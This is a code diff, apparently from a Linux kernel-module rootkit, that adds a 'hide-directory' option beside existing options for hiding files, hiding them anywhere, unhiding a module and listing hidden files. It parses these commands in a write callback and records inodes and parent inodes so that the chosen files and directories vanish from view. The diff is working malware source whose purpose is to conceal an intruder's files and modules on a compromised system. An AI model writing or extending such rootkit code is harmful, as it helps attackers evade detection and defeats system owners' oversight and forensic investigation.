@@ -431,6 +431,7 @@ enum {
 
     /** file stealth operations */
     Opt_hide_file,
+    Opt_hide_directory,
     Opt_hide_file_anywhere,
     Opt_list_hidden_files,
     Opt_unhide_file,
@@ -451,6 +452,7 @@ static const match_table_t tokens = {
     {Opt_unhide_module, "unhide-lkm=%s"},
 
     {Opt_hide_file, "hide-file=%s"},
+    {Opt_hide_directory, "hide-directory=%s"},
     {Opt_hide_file_anywhere, "hide-file-anywhere=%s"},
     {Opt_list_hidden_files,"list-hidden-files"},
     {Opt_unhide_file, "unhide-file=%s"},
@@ -517,10 +519,29 @@ static ssize_t write_cb(struct file *fptr, const char __user *user,
                     if (fs_kern_path(s, &path) && fs_file_stat(&path, &stat)) {
                         /** It is filename, no problem because we have path.dentry */
                         const char *f = kstrdup(path.dentry->d_name.name, GFP_KERNEL);
-                        bool is_dir = ((stat.mode & S_IFMT) == S_IFDIR);
-
                         path_put(&path);
-                        fs_add_name_rw_dir(f, stat.ino, is_dir);
+                        fs_add_name_rw(f, stat.ino);
+                        kv_mem_free(&f);
+                    } else {
+                        if (*s != '.' && *s != '/') {
+                            fs_add_name_rw(s, stat.ino);
+                        }
+                    }
+                }
+                break;
+            case Opt_hide_directory:
+                {
+                    char *s = args[0].from;
+                    struct kstat stat = {0};
+                    struct path path;
+
+                    if (fs_kern_path(s, &path) && fs_file_stat(&path, &stat)) {
+                        /** It is filename, no problem because we have path.dentry */
+                        const char *f = kstrdup(path.dentry->d_name.name, GFP_KERNEL);
+                        bool is_dir = ((stat.mode & S_IFMT) == S_IFDIR);
+                        u64 parent_inode = fs_get_parent_inode(&path);
+                        fs_add_name_rw_dir(f, stat.ino, parent_inode, is_dir);
+                        path_put(&path);
                         kv_mem_free(&f);
                     } else {
                         if (*s != '.' && *s != '/') {
@@ -531,16 +552,7 @@ static ssize_t write_cb(struct file *fptr, const char __user *user,
                 }
                 break;
             case Opt_hide_file_anywhere:
-                {
-                    char *s = args[0].from;
-                    struct kstat stat;
-                    struct path path;
-
-                    if (fs_kern_path(s, &path) && fs_file_stat(&path, &stat)) {
-                        bool is_dir = ((stat.mode & S_IFMT) == S_IFDIR);
-                        fs_add_name_rw_dir(s, 0, is_dir);
-                    }
-                }
+                fs_add_name_rw(args[0].from, 0);
                 break;
             case Opt_list_hidden_files:
                 fs_list_names();
